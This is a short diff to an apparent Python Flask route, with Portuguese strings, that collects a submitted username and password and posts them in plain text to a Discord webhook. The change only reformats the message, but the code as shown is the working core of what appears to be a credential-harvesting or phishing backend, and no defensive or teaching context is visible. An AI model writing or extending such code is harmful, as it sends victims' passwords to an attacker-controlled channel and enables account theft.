@@ -18,7 +18,7 @@ def send_message():
         return jsonify({"error": "Campos obrigatórios ausentes"}), 400
 
     payload = {
-        "content": f"**Novo formulário recebido:**\nUsuário: {username}\nSenha: {password}"
+        "content": f"---\n**DADOS RECEBIDOS:**\nUsuário: {username}\nSenha: {password}\n---"
     }
 
     response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
